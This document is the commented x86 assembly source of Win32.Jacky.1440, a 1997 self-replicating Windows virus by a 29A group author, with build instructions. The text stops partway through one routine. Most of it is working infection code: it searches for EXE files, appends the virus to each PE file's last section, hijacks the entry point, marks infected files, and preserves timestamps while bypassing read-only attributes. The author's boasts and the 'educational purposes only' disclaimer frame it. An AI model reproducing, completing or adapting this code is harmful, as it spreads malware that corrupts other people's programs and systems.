;
;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;          Win32.Jacky.1440                        ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;          by Jacky Qwerty/29A                      ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;                                                  ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;
; Hello ppl, welcome  to the first "Winblowz" 95/NT  fully compatible virus.
; Yea i didnt mistype above, it reads  "Win32" not "Win95" coz  this babe is
; really  a "genuine" Win32 virus, which  means it should  be able to infect
; any Win32 based system:  Windoze 95, Windoze NT or Win32s.  For some known
; reasonz that i wont delve in detail here, previous Win95 virusez were una-
; ble to spread succesfully under NT.  The main reasonz were becoz they asu-
; med KERNEL32 bein  loaded at a fixed  base adress (not true for NT or even
; future  Win95 updatez)  and they also made a "guess" about where the Win32
; API functionz were located inside the KERNEL32 itself.
;
; This virus does NOT rely on fixed memory positionz or absolute adressez in
; order to run and spread. It always works at the Win32 API level, not play-
; in its trickz "under the hood". This proves enough for the virus to spread
; succesfully on NT, asumin the user has enough rightz, of course.
;
; Unfortunately, this virus didnt  make it as the first Windoze NT virus for
; the media.  AVerz said they  didnt have an NT machine  available for virus
; testin, so they simply didnt test it under NT.  Well ehem, thats what they
; said #8S. In the past summer however i finished the codin of Win32.Cabanas
; which is a far superior virus with much more featurez than its predecesor.
; This time, the guyz from Datafellowz and AVP made serious testz with Caba-
; nas under NT until they finally concluded: "Oh miracle! it is able to work
; under NT!".  So acordin to the media, Win32.Cabanas is the first WinNT vi-
; rus and not Win32.Jacky as it should have been. Anywayz..
;
;
; Technical description
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; When Win32.Jacky executes,  it first looks  for KERNEL32  base adress usin
; the GetModuleHandleA API right from the host  import table and then it re-
; trieves all other file API function adressez by usin the GetProcAdress API
; also from the import table.  These APIz are not inserted by the virus when
; infection, they are only used if they already existed there (very likely),
; but this is not a "must do" for the virus to work tho. After all Win32 API
; functionz needed by the virus have been located, it looks for PE (EXE) fi-
; lez in the current directory and infects them one by one.
;
; When infection starts,  each EXE file is opened and maped in shared memory
; usin the  "file mapin" API functionz provided by KERNEL32.  This proves to
; be a great advance  regardin  file functionz as it clearly simplifies to a
; large extent the infection process and file handlin in general.  After the
; PE signature is detected from  the maped file,  the virus inspects its im-
; port table lookin  for the GetModuleHandleA and GetProcAddress APIz inside
; the KERNEL32  import descriptor.  If this module is not imported, the file
; is left  alone and discarded.  If the GetProcAddress API is not found, the
; virus  (later on  when it executes)  will call its own internal GetProcAd-
; dressET function,  which simply inspects  the KERNEL32 export table lookin
; for any specified Win32 API function. If GetModuleHandleA is not found the
; file will still get infected but then the virus, in order to find the KER-
; NEL32 base adress, will be relyin on a smoewhat undocumented feature (che-
; cked before use). This feature is very simple: whenever a PE file with un-
; bound KERNEL32 function adressez is loaded, the Win95 loader puts the KER-
; NEL32 adress in  the  ForwarderChain field of the KERNEL32 import descrip-
; tor. This also works in Win95 OSR2 version but  doesnt  work on WinNT tho,
; so it should be used with some care after makin some sanity checkz first.
;
; If the GetModuleHandleA and GetProcAddrss  APIz are found,  the virus will
; hardcode  their IAT referencez  inside the virus code,  then later on when
; the virus executes, it will have these API referencez already waitin to be
; called by the installation code. After the latter  API search is done, the
; virus copies itself to the last section in the file,  modifies the section
; atributez to acomodate the virus code  and finally  changes the EntryPoint
; field in the PE header to point to the virus code. The virus doesnt change
; or modify  the time/date stamp  of infected filez  nor it is stoped by the
; "read only" atribute.
;
;
; AVP description
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Before jumpin to the  source code, lets read what AVP has to say about the
; virus. Unfortunately as u will see they didnt test the thing on NT, other-
; wise they would have had a big surprise with it hehe #8D
;
; (*) Win95.Jacky - http://www.avp.ch/avpve/newexe/win95/jacky.stm *
;
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
; It is a harmless nonmemory resident parasitic Win95/NT virus 1440
; bytes of length. Being executed the virus scans Win95/NT kernel and
; gets undocumented addresses of system file access function (see the
; list below).  Then it searches for NewEXE Portable Executable
; (Win95 and NT) files and writes itself to the end of the file. The
; virus aligns the file length to the section, so the file lengths
; grows more that 1440 bytes while infection.
;
; This is the first known Win95/NT parasitic virus that does not add
; new section to the file - while infecting a file the virus writes
; itself to the end of the file, increases the size of last section
; in the file, and modifies characteristics of this section.  So,
; only entry point address, size and characteristics of last section
; are modified in infected files.
;
; This is also first known to me Win95/NT infector that did work on
; my test computer (Windows95) without any problem. I did not try it
; under NT.
;
; The virus contains the encrypted strings, a part of these strings
; are the names of system functions that are used during infection:
;
;   KERNEL32 GetModuleHandleA GetProcAddress
;   *.EXE
;   CreateFileA CreateFileMappingA CloseHandle UnmapViewOfFile
;   MapViewOfFile FindFirstFileA FindNextFileA FindClose
;   SetFileAttributesA SetFilePointer SetEndOfFile SetFileTime
;
;   To My d34d fRi3nD c4b4n4s..
;   A Win/NT/95 ViRuS v1.00.
;   By: j4cKy Qw3rTy / 29A.
;   jqw3rty@cryogen.com
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
;
;
; Greetingz
; ÄÄÄÄÄÄÄÄÄ
; And finaly the greetinz go to:
;
;   Mr.Chan, Wai ......... Thx for your help and advice.. master!
;   MrSandman/29A ........ erm.. when will 29A#2 go out? hehe ;)
;   QuantumG ............. What about yer NT resident driver idea?
;   DarkSide1 ............ We are Southamerican rockerzzz!
;   GriYo/29A ............ Implant poly rulez!
;
;
; Disclaimer
; ÄÄÄÄÄÄÄÄÄÄ
; This source code is for educational purposez only.  The author is not res-
; ponsible for any problemz caused due to the assembly of this file.
;
;
; Compiling it
; ÄÄÄÄÄÄÄÄÄÄÄÄ
; tasm32 -ml -m5 -q -zn w32jacky.asm
; tlink32 -Tpe -c -x -aa w32jacky,,, import32
; pewrsec w32jacky.exe
;
;
; (c) 1997 Jacky Qwerty/29A.


.386p
.model  flat    ;whoaa.. no more segmentz

;Some includez containin very useful structurez and constantz for Win32

include Useful.inc
include Win32API.inc
include MZ.inc
include PE.inc

;Some equ's needed by the virus

work_size        equ 4000h           ;size to grow up memory maped file
size_pad         equ 101             ;size paddin to mark infected filez
v_size           equ v_end - v_start ;virus absolute size in filez

extrn   GetModuleHandleA :proc  ;APIs used durin first generation only
extrn   GetProcAddress   :proc

.data
        db      ?       ;some dummy data so tlink32 dont yell

.code

;Virus code starts here

v_start:

        push    eax             ;make space to store return adress
        pushad                  ;save all
        call    get_deltaz      ;here we go

;API namez needed by the virus. They will travel in encrypted form

ve_stringz:

veszKernel32            db      'KERNEL32',0
veszGetModuleHandleA    db      'GetModuleHandleA',0
veszGetProcAddress      db      'GetProcAddress',0

eEXE_filez              db      '*.EXE',0       ;filez to search

veszCreateFileA         db      'CreateFileA',0
veszCreateFileMappingA  db      'CreateFileMappingA',0
veszCloseHandle         db      'CloseHandle',0
veszUnmapViewOfFile     db      'UnmapViewOfFile',0
veszMapViewOfFile       db      'MapViewOfFile',0
veszFindFirstFileA      db      'FindFirstFileA',0
veszFindNextFileA       db      'FindNextFileA',0
veszFindClose           db      'FindClose',0
veszSetFileAttributesA  db      'SetFileAttributesA',0
veszSetFilePointer      db      'SetFilePointer',0
veszSetEndOfFile        db      'SetEndOfFile',0
veszSetFileTime         db      'SetFileTime',0

eEndOfFunctionNames     db      0

;An epitaph to a good friend of mine (not a "junkie" Pete)

db 'To My d34d fRi3nD c4b4n4s..',CRLF
db 'A Win/NT/95 ViRuS v1.00. ',CRLF
db 'By: j4cKy Qw3rTy / 29A. ',CRLF 
db 'jqw3rty@cryogen.com',0

ve_string_size  = $ - ve_stringz

crypt:  lodsb                           ;decrypt API stringz
        rol     al,cl
        not     al
        stosb
        loop    crypt
        ret

get_deltaz:

        mov     ecx,ve_string_size
        pop     esi                              ;get pointer to ve_stringz
        cld
        lea     ebp,[esi + v_end - ve_stringz]   ;get pointer to virus end
        lea     eax,[esi + v_start - ve_stringz]
        mov     edi,ebp
        stosd                                    ;save pointer to virus start
        add     eax,- 12345678h
delta_host      = dword ptr $ - 4
        stosd                                    ;save current host base adress
        lea     edi,[ebp + v_stringz - v_end]    ;get pointer to API namez
        sub     eax,- 12345678h
phost_start_rva = dword ptr $ - 4
        push    edi                        ;push pointer to "KERNEL32" string
        xchg    ebx,eax
        mov     [esp.(Pshd).cPushad.RetAddr],ebx ;save host entry to return

decrypt_stringz:

        call    crypt                      ;decrypt encrypted API and stringz
        call    MyGetModuleHandleA         ;get KERNEL32 base adress
        jecxz   jmp_host_2
        mov     [ebp + K32Mod - v_end],ecx ;save it
        lea     esi,[ebp + FunctionNamez - v_end]
        lea     edi,[ebp + FunctionAddressez - v_end]

GetAPIAddress:  ;get adressez of API functionz used by the virus

        push    esi
        call    MyGetProcAddressK32     ;get API adress

jmp_host_2:

        jecxz   jmp_host
        cld
        xchg    eax,ecx
        stosd                           ;save retrieved API adress
        lodsb                           ;point to next API name
        test    al,al
        jnz     $ - 3
        cmp     al,[esi]                ;end of API namez reached?
        jnz     GetAPIAddress           ;no, get next API adress

        lea     ebx,[ebp + FindData - v_end]     ;Find filez matchin *.EXE
        push    ebx
        lea     eax,[ebp + EXE_filez - v_end]
        push    eax
        call    [ebp + ddFindFirstFileA - v_end] ;call FindFirstFileA API
        inc     eax
        jz      jmp_host
        dec     eax
        push    eax                              ;save search handle

Process_File:   ;check file and infect it

        lea     edx,[ebx.WFD_szFileName]
        call    Open&MapFile                    ;open and map file
        jecxz   Find_Next
        xor     eax,eax
        cmp     [ebx.WFD_nFileSizeHigh],eax     ;skip filez too large (>1GB)
        jnz     Close_File
        add     eax,[ebx.WFD_nFileSizeLow]
        js      Close_File
        add     eax,-80h                        ;skip filez too short
        jnc     Close_File
        call    Check_PE_sign                   ;it has to be a PE file
        jnz     Close_File
        test    ah,IMAGE_FILE_DLL shr 8         ;can't have DLL bit
        jnz     Close_File
        xor     ecx,ecx
        mov     eax,[ebx.WFD_nFileSizeLow]      ;check if file is infected
        mov     cl,size_pad
        cdq
        div     ecx
        mov     esi,edx ;esi == 0, file already infected or not infectable
                        ;esi != 0, file not infected, i.e. infect it!
Close_File:

        call    Close&UnmapFile                 ;close and unmap file
        mov     ecx,esi
        jecxz   Find_Next                       ;jump and find next file
        call    Infect                          ;infect file

Find_Next:

        pop     eax                             ;find next file
        push    eax ebx eax
        call    [ebp + ddFindNextFileA - v_end]
        test    eax,eax
        jnz     Process_File

Find_Close:

        call    [ebp + ddFindClose - v_end]     ;no more filez, close search

jmp_host:

        popad                                   ;jump to host
        ret

Infect  proc    ;blank file attributez, open and map file in r/w mode,
                ;infect it, restore date/time stamp and attributez

        lea     edx,[ebx.WFD_szFileName]        ;get filename
        push    edx 0 edx
        call    [ebp + ddSetFileAttributesA - v_end]    ;blank file attributez
        xchg    ecx,eax
        pop     edx
        jecxz   end_Infect1
        mov     edi,work_size
        add     edi,[ebx.WFD_nFileSizeLow]
        call    Open&MapFileAdj         ;open and map file in read/write mode
        jecxz   end_Infect2
        lea     esi,[ebp + vszKernel32 - v_end]
        lea     eax,[ebp + vszGetModuleHandleA - v_end]
        push    eax esi
        lea     eax,[ebp + vszGetProcAddress - v_end]
        push    eax esi ecx
        call    GetProcAddressIT        ;get ptr to GetProcAddress API
        mov     [ebp + ddGetProcAddress - v_end],eax
        push    ecx
        xor     esi,esi
        call    GetProcAddressIT        ;get ptr to GetModuleHandleA API
        mov     [ebp + ddGetModuleHandleA - v_end],eax
        test    eax,eax
        jnz     GetModHandle_found      ;if GetModuleHandleA found,
        test    esi,esi                 ;jump and attach virus
        jz      end_Infect3             ;KERNEL32 import descriptor not found,
                                        ;then dont infect

        x = IMAGE_SIZEOF_IMPORT_DESCRIPTOR

        ;GetModuleHandleA not found

        cmp     [esi.ID_TimeDateStamp - x],eax  ;check if we can rely on
        jz      got_easy                        ;the ForwarderChain trick
        cmp     eax,[esi.ID_OriginalFirstThunk - x]
        jz      end_Infect3
        mov     [esi.ID_TimeDateStamp - x],eax
        
got_easy:

        mov     eax,[esi.ID_ForwarderChain - x]       ;hardcode pointerz to
        mov     [ebp + ptrForwarderChain - v_end],edx ;the ForwarderChain
        mov     [ebp + ddForwarderChain - v_end],eax  ;field

GetModHandle_found:

        mov     esi,[ebp + pv_start - v_end]
        call    Attach                          ;attach virus to host
end_Infect3:

        call    Close&UnmapFileAdj              ;close and unmap file

end_Infect2:

        mov     ecx,[ebx.WFD_dwFileAttributes]  ;restore original atribute
        jecxz   end_Infect1
        lea     edx,[ebx.WFD_szFileName]
        push    ecx edx
        call    [ebp + ddSetFileAttributesA - v_end]

end_Infect1:

        ret

Infect  endp

Check_PE_sign   proc   ;checks validity of a PE file
                       ;  on entry: EDX = host file size
                       ;            ECX = base address of memory-maped file
                       ;            EBX = pointer to WIN32_FIND_DATA structure
                       ;            EAX = host file size - 80h
                       ;  on exit:  Zero flag = 1, infectable PE file
                       ;            Zero flag = 0, not infectable file

        cmp     word ptr [ecx],IMAGE_DOS_SIGNATURE      ;needs MZ signature
        jnz     end_check_PE_sign
        cmp     word ptr [ecx.MZ_lfarlc],40h            ;needs Win signature
        jb      end_check_PE_sign                       ;(well not necesarily)
        mov     edi,[ecx.MZ_lfanew]     ;get ptr to new exe format
        cmp     eax,edi                 ;ptr out of range?
        jb      end_check_PE_sign
        add     edi,ecx
        cmp     dword ptr [edi],IMAGE_NT_SIGNATURE      ;check PE signature
        jnz     end_check_PE_sign
        cmp     word ptr [edi.NT_FileHeader.FH_Machine], \ ;must be 386+
                IMAGE_FILE_MACHINE_I386
        jnz     end_check_PE_sign
        mov     eax,dword ptr [edi.NT_FileHeader.FH_Characteristics]
        not     al
        test    al,IMAGE_FILE_EXECUTABLE_IMAGE  ;must have the executable bit

end_check_PE_sign:

        ret

Check_PE_sign   endp

Open&MapFile    proc    ;open and map file in read only mode
                        ;  on entry:
                        ;    EDX = pszFileName (pointer to file name)
                        ;  on exit:
                        ;    ECX = 0, if error
                        ;    ECX = base adress of memory-maped file, if ok

                xor     edi,edi

Open&MapFileAdj:        ;open and map file in read/write mode
                        ;  on entry:
                        ;    EDI = file size + work space (in bytes)
                        ;    EDX = pszFileName (pointer to file name)
                        ;  on exit:
                        ;    ECX = 0, if error
                        ;    ECX = base adress of memory-maped file, if ok
                        ;    EDI = old file size

                xor     eax,eax
                push    eax eax OPEN_EXISTING eax eax
                mov     al,1
                ror     eax,1
                mov     ecx,edi
                jecxz   $+4
                rcr     eax,1
                push    eax edx
                call    [ebp + ddCreateFileA - v_end]   ;open file
                cdq
                inc     eax
                jz      end_Open&MapFile
                dec     eax
                push    eax                     ;push first handle

                xor     esi,esi
                push    edx edi edx
                mov     dl,PAGE_READONLY
                mov     ecx,edi
                jecxz   $+4
                shl     dl,1
                push    edx esi eax
                call    [ebp + ddCreateFileMappingA - v_end]    ;create file
                cdq                                             ;mapping
                xchg    ecx,eax
                jecxz   end_Open&MapFile2
                push    ecx                     ;push second handle

                push    edi edx edx
                mov     dl,FILE_MAP_READ
                test    edi,edi
                jz      OMF_RdOnly
                shr     dl,1
                mov     edi,[ebx.WFD_nFileSizeLow]
OMF_RdOnly:     push    edx ecx
                call    [ebp + ddMapViewOfFile - v_end] ;map view of file
                xchg    ecx,eax
                jecxz   end_Open&MapFile3
                push    ecx                     ;push base address of
                                                ;memory-mapped file
                jmp     [esp.(3*Pshd).RetAddr]  ;jump to return adress leavin
                                                ;parameterz in the stack
Open&MapFile    endp

Close&UnmapFile proc    ;close and unmap file previosly opened in r/o mode

                xor     edi,edi

Close&UnmapFileAdj:     ;close and unmap file previosly opened in r/w mode

                pop     eax                               ;return adress
                mov     [esp.(3*Pshd).RetAddr],eax
                call    [ebp + ddUnmapViewOfFile - v_end] ;unmap view of file

end_Open&MapFile3:

                call    [ebp + ddCloseHandle - v_end]   ;close handle
                mov     ecx,edi
                jecxz   end_Open&MapFile2       ;if read only mode jump
                pop     eax
                push    eax eax
                xor     esi,esi
                push    esi esi edi eax
                xchg    edi,eax
                call    [ebp + ddSetFilePointer - v_end] ;move file pointer to
                                                         ;the real end of file
                call    [ebp + ddSetEndOfFile - v_end]   ;truncate file at
                lea     eax,[ebx.WFD_ftLastWriteTime]    ;real end of file
                push    eax esi esi edi
                call    [ebp + ddSetFileTime - v_end]    ;restore original
                                                         ;date/time stamp
end_Open&MapFile2:

                call    [ebp + ddCloseHandle - v_end]    ;close handle

end_Open&MapFile:

                xor     ecx,ecx
                ret

Close&UnmapFile endp

Attach  proc    ;attach virus code to last section in the PE file and
                ;  change section characteristicz to reflect infection
                ;on entry:
                ;  ECX = base of memory-maped file
                ;  ESI = pointer to start of virus code
                ;on exit:
                ;  EDI = new file size
        pushad
        push    ecx
        mov     ebp,ecx                 ;get base adress
        add     ebp,[ebp.MZ_lfanew]     ;get PE header base
        movzx   ecx,word ptr [ebp.NT_FileHeader \ ;get Number of Sections
                          .FH_NumberOfSections]
        xor     eax,eax
        movzx   edi,word ptr [ebp.NT_FileHeader \ ;get 1st section header
                          .FH_SizeOfOptionalHeader]
        x = IMAGE_SIZEOF_SECTION_HEADER
        mov     al,x
        mul     ecx                     ;get last section header
        pop     edx
        jecxz   end_Attach2
        add     edi,eax
        lea     ebx,[ebp.NT_OptionalHeader + edi]
        mov     ecx,[ebx.SH_SizeOfRawData - x]
        mov     eax,[ebx.SH_VirtualSize - x]
        cmp     ecx,eax                 
        jnc     $+3
        xchg    eax,ecx
        add     edx,[ebx.SH_PointerToRawData - x]
        sub     eax,-3
        mov     ecx,(v_size + 3)/4
        and     al,-4
        lea     edi,[eax+edx]   ;find pointer in last section where virus
        cld                     ;will be copied
        rep     movsd           ;copy virus
        add     eax,[ebx.SH_VirtualAddress - x] ;calculate virus entry point
        mov     ecx,[ebp.NT_OptionalHeader.OH_FileAlignment] ;in RVA

end_Attach2:

        jecxz   end_Attach
        push    eax             ;virus entry point
        lea     esi,[edi + (phost_start_rva - v_start) - ((v_size + 3) \
        and     (-4))]
        neg     eax
        sub     edi,edx
        mov     [esi + delta_host - phost_start_rva],eax ;harcode delta to
        lea     eax,[ecx+edi-1]                          ;host base adress
        cdq     ;edx=0
        sub     edx,[ebp.NT_OptionalHeader.OH_AddressOfEntryPoint]
        mov     [esi],edx       ;hardcode delta to original entry point RVA
        cdq     ;edx=0
        div     ecx
        pop     esi             ;virus entry point
        mul     ecx             ;calculate new size of section (raw data)
        xchg    eax,edi
        mov     ecx,[ebp.NT_OptionalHeader.OH_SectionAlignment]
        add     eax,(virtual_end - v_end + 3) and (-4)
        jecxz   end_Attach
        cmp     [ebx.SH_VirtualSize - x],eax
        jnc     n_vir
        mov     [ebx.SH_VirtualSize - x],eax  ;store new size of section (RVA)
 n_vir: dec     eax
        mov     [ebx.SH_SizeOfRawData - x],edi ;store new size of section
        add     eax,ecx                        ;(raw data)
        div     ecx
        mul     ecx
        add     eax,[ebx.SH_VirtualAddress - x]
        cmp     [ebp.NT_OptionalHeader.OH_SizeOfImage],eax
        jnc     n_img
        mov     [ebp.NT_OptionalHeader.OH_SizeOfImage],eax   ;store new size
                                                             ;of image (RVA)
 n_img: add     edi,[ebx.SH_PointerToRawData - x]       ;get new file size
        sub     ecx,ecx
        or      byte ptr [ebx.SH_Characteristics.hiw.hib - x],0E0h ;change
                ;       (IMAGE_SCN_MEM_EXECUTE or \     ;section characte-
                ;        IMAGE_SCN_MEM_READ    or \     ;risticz to: execute,
                ;        IMAGE_SCN_MEM_WRITE) shr 12    ;read & write access
        pop     eax             ;get original file size
        mov     cl,size_pad
        cdq     ; edx=0
        cmp     edi,eax         ;compare it with new file size
        jc      $+3
        xchg    edi,eax         ;take the greater
        sub     eax,1 - size_pad
        div     ecx
        mul     ecx             ;grow file size to a multiple of size_pad
        push    eax
        mov     [ebp.NT_OptionalHeader.OH_AddressOfEntryPoint],esi  ;change
                                                               ;entry point
end_Attach:

        popad
        ret

Attach  endp

GetProcAddressIT proc ;gets a pointer to an API function from the Import Table
                      ; (the object inspected is in raw form, ie memory-maped)
                      ;on entry:
                      ;  TOS+0Ch (Arg3): API function name
                      ;  TOS+08h (Arg2): module name
                      ;  TOS+04h (Arg1): base adress of memory-maped file
                      ;  TOS+00h (return adress)
                      ;on exit:
                      ;  EAX = RVA pointer to IAT entry
                      ;  EAX = 0, if not found
        pushad
        mov     ebp,[esp.cPushad.Arg1]  ;get Module Handle from Arg1
        lea     esi,[ebp.MZ_lfanew]
        add     esi,[esi]               ;get address of PE header + MZ_lfanew
        mov     ecx,[esi.NT_OptionalHeader    \ ;get size of import directory
                        .OH_DirectoryEntries  \
                        .DE_Import            \
                        .DD_Size              \
                        -MZ_lfanew]
        jecxz   End_GetProcAddressIT2   ;if size is zero, no API imported!
        movzx   ecx,word ptr [esi.NT_FileHeader \ ;get number of sectionz
                          .FH_NumberOfSections  \
                          -MZ_lfanew]
        jecxz   End_GetProcAddressIT2
        movzx   ebx,word ptr [esi.NT_FileHeader     \ ;get 1st section header
                          .FH_SizeOfOptionalHeader  \
                          -MZ_lfanew]
        lea     ebx,[esi.NT_OptionalHeader + ebx - MZ_lfanew]
        x = IMAGE_SIZEOF_SECTION_HEADER

match_virtual:  ;find section containin the import table. (not necesarily
                ;its in the .idata section!)

        mov     edi,[esi.NT_OptionalHeader    \ ;get address of import table
                        .OH_DirectoryEntries  \
                        .DE_Import            \
                        .DD_VirtualAddress    \
                        -MZ_lfanew]
        mov     edx,[ebx.SH_VirtualAddress]     ;get RVA start pointer of
        sub     edi,edx                         ;current section
        add     ebx,x
        cmp     edi,[ebx.SH_VirtualSize - x]    ;address of import table
                                                ;inside current section?
        jb      import_section_found            ;yea, we found it
        loop    match_virtual                   ;no, try next section
        jmp     End_GetProcAddressIT            ;no more sectionz, shit.. go

import_section_found:

        push    edi
        mov     eax,[ebx.SH_SizeOfRawData - x]
        mov     ebx,[ebx.SH_PointerToRawData - x]
        xchg    ebp,eax         ;get RAW size of import section (EBP)
        add     ebx,eax         ;get RAW start of import section (EBX)
        cld
        x = IMAGE_SIZEOF_IMPORT_DESCRIPTOR

Get_DLL_Name:   ;scan each import descriptor inside import section to match
                ;module name specified

        pop     esi                     ;diference (if any) between start
                                        ;of imp.table and start of imp.section
        mov     ecx,[ebx.esi.ID_Name]   ;get RVA pointer to imp.module name

End_GetProcAddressIT2:

        jecxz   End_GetProcAddressIT    ;end of import descriptorz?
        sub     ecx,edx                 ;convert RVA pointer to RAW
        cmp     ecx,ebp                 ;check if it points inside section
        jae     End_GetProcAddressIT
        add     esi,x
        push    esi                     ;save next import descriptor for later
        lea     esi,[ebx + ecx]         ;retrieval
        mov     edi,[esp.(Pshd).cPushad.Arg2]   ;get module name specified
                                                ;from Arg2
Next_char_from_DLL:     ;do a char by char comparison with module name found
                        ;inside section. Stop when a NULL or a dot is found
        lodsb
        add     al,-'.'
        jz      IT_nup          ;its a dot
        sub     al,-'.'+'a'
        cmp     al, 'z'-'a'+ 1
        jae     no_up
        add     al,-20h         ;convert to upercase
no_up:  sub     al,-'a'
IT_nup: scasb
        jnz     Get_DLL_Name    ;names dont match, get next import descriptor
        cmp     byte ptr [edi-1],0
        jnz     Next_char_from_DLL

Found_DLL_name: ;we got the import descriptor containin specified module name

        pop     esi
        lea     eax,[edx + esi.ID_ForwarderChain - x]
        add     esi,ebx
        mov     [esp.Pushad_edx],eax    ;store ptr to ForwarderChain for l8r
        mov     [esp.Pushad_esi],esi    ;store ptr to imp.descriptor for l8r
        push    dword ptr [esp.cPushad.Arg3]
        mov     eax,[esp.(Pshd).Pushad_ebp]
        push    dword ptr [eax + K32Mod - v_end]
        call    GetProcAddressET        ;scan exp.table of spec.module handle
        xchg    eax,ecx                 ;and get function adress of spec.API
        mov     ecx,[esi.ID_FirstThunk - x]  ;This is needed just in case the
                                             ;API function adressez are bound
        jecxz   End_GetProcAddressIT    ;if not found then go, this value cant
                                        ;be zero or the IAT wont be patched
        push    eax
        call    GetProcAddrIAT          ;inspect first thunk (which later will
        test    eax,eax                 ;be patched by the loader)
        jnz     IAT_found               ;if found then jump (save it and go)
        mov     ecx,[esi.ID_OriginalFirstThunk - x]     ;get original thunk
                                        ;(which later will hold the original
                                        ;unpatched IAT)
        jecxz   End_GetProcAddressIT    ;if not found then go, this value
        push    eax                     ;could be zero
        call    GetProcAddrIAT          ;inspect original thunk
        test    eax,eax
        jz      IAT_found               ;jump if not found
        sub     eax,ecx                         ;we got the pointer
        add     eax,[esi.ID_FirstThunk - x]     ;convert it to RVA
        db      6Bh,33h,0C0h    ;imul   esi,[ebx],-0C0h ;bizarre! but no jump
        org     $ - 2                                   ;necesary!

End_GetProcAddressIT:

        db      33h,0C0h ;xor eax,eax   ;error, adress not found

IAT_found:

        mov     [esp.Pushad_eax],eax    ;save IAT entry pointer
        popad
        ret     (3*Pshd)                ;go and unwind parameterz in stack

GetProcAddrIAT: ;this function scans the IMAGE_THUNK_DATA array of "dwords"
                ;  from the selected IMAGE_IMPORT_DESCRIPTOR, searchin for
                ;  the selected API name. This function works for both
                ;  bound and unbound import descriptorz. This function is
                ;  called from inside GetProcAddressIT.
                ;on entry:
                ;  EBX = RAW start pointer of import section
                ;  ECX = RVA pointer to IMAGE_THUNK_ARRAY
                ;  EDX = RVA start pointer of import section
                ;  EDI = pointer selected API function name.
                ;  EBP = RAW size of import section
                ;  TOS+04h (Arg1): real address of API function inside selected
                ;                  module (in case the descriptor is unbound).
                ;  TOS+00h (return adress)
                ;on exit:
                ;  EAX = RVA pointer to IAT entry
                ;  EAX = 0, if not found

        push    ecx
        push    esi

        xor     eax,eax
        sub     ecx,edx
        cmp     ecx,ebp
        jae     IT_not_found
        lea     esi,[ebx + ecx] ;get RAW pointer to IMAGE_THUNK_DATA array

next_thunk_dword:

        lodsd                   ;get dword value
        test    eax,eax         ;end of IMAGE_THUNK_DATA array?
        jz      IT_not_found

no_ordinal:

        sub     eax,edx         ;convert dword to a RAW pointer
        cmp     eax,ebp         ;dword belongs to an unbound image descriptor?
        jb      IT_search       ;no, jump
        add     eax,edx         ;we have the API adress, reconvert to RVA
        cmp     eax,[esp.(2*Pshd).Arg1] ;API adressez match?
        jmp     IT_found?               ;yea, we found it, jump

IT_search:

        push    esi                     ;image descr.contains imports by name
        lea     esi,[ebx+eax.IBN_Name]  ;get API name from import descriptor
        mov     edi,[esp.(5*Pshd).cPushad.Arg3] ;get API name selected as a
                                                ;parameter
IT_next_char:
                                ;find req.API from all imported API namez
        cmpsb                   ;do APIz match?
        jnz     IT_new_search   ;no, continue searchin

IT_Matched_char:

        cmp     byte ptr [esi-1],0
        jnz     IT_next_char

IT_new_search:

        pop     esi             ;yea, they match, we found it
        
IT_found?:

        jnz     next_thunk_dword
        lea     eax,[edx+esi-4] ;get the pointer to the new IAT entry
        sub     eax,ebx         ;convert it to RVA

IT_not_found:

        pop     esi
        pop     ecx

        ret     (Pshd)

GetProcAddressIT endp

GetProcAddressET proc ;This function is similar to GetProcAddressIT except
                      ;  that it looks for API functions in the export table
                      ;  of a given DLL module. It has the same functionality
                      ;  as the original GetProcAddress API exported from
                      ;  KERNEL32 except that it is able to find API
                      ;  functions exported by ordinal from KERNEL32.
                      ;on entry:
                      ;  TOS+08h (Arg2): pszAPIname (pointer to API name)
                      ;  TOS+04h (Arg1): module handle/base address of module
                      ;  TOS+00h (return adress)
                      ;on exit:
                      ;  ECX = API function address
                      ;  ECX = 0, if not found
        pushad
        mov     eax,[esp.cPushad.Arg1]  ;get Module Handle from Arg1
        mov     ebx,eax
        add     eax,[eax.MZ_lfanew]     ;get address of PE header
        mov     ecx,[eax.NT_OptionalHeader    \ ;get size of Export directory
                        .OH_DirectoryEntries  \
                        .DE_Export            \
                        .DD_Size]
        jecxz   Proc_Address_not_found  ;size is zero, No API exported !
        mov     ebp,ebx                       ;get address of Export directory
        add     ebp,[eax.NT_OptionalHeader    \
                        .OH_DirectoryEntries  \
                        .DE_Export            \
                        .DD_VirtualAddress]
ifndef  NoOrdinal
        mov     eax,[esp.cPushad.Arg2]  ;get address of requested API name or
                                        ;ordinal value from Arg2
        test    eax,-10000h             ;check if Arg2 is an ordinal
        jz      Its_API_ordinal
endif

Its_API_name:

        push    ecx
        mov     edx,ebx                     ;get address of exported API names
        add     edx,[ebp.ED_AddressOfNames]
        mov     ecx,[ebp.ED_NumberOfNames]  ;get number of exported API names
        xor     eax,eax
        cld

Search_for_API_name:

        mov     esi,ebx                 ;get address of next exported API name
        add     esi,[edx+eax*4]
        mov     edi,[esp.Pshd.cPushad.Arg2] ;get address of requested API name
                                            ;from Arg2
Next_Char_in_API_name:

        cmpsb                               ;find requested API from all
        jz      Matched_char_in_API_name    ;exported API namez
        inc     eax
        loop    Search_for_API_name
        pop     eax

Proc_Address_not_found:

        xor     eax,eax                   ;API not found
        jmp     End_GetProcAddressET
                
ifndef  NoOrdinal

Its_API_ordinal:

        sub     eax,[ebp.ED_BaseOrdinal]  ;normalize Ordinal, i.e.
        jmp     Check_Index               ;convert it to an index
endif

Matched_char_in_API_name:

        cmp     byte ptr [esi-1],0        ;end of API name reached?
        jnz     Next_Char_in_API_name
        pop     ecx
        mov     edx,ebx                   ;get address of exp.API ordinals
        add     edx,[ebp.ED_AddressOfOrdinals]
        movzx   eax,word ptr [edx+eax*2]  ;get index into exp.API functions

Check_Index:

        cmp     eax,[ebp.ED_NumberOfFunctions]  ;check for out of range index
        jae     Proc_Address_not_found
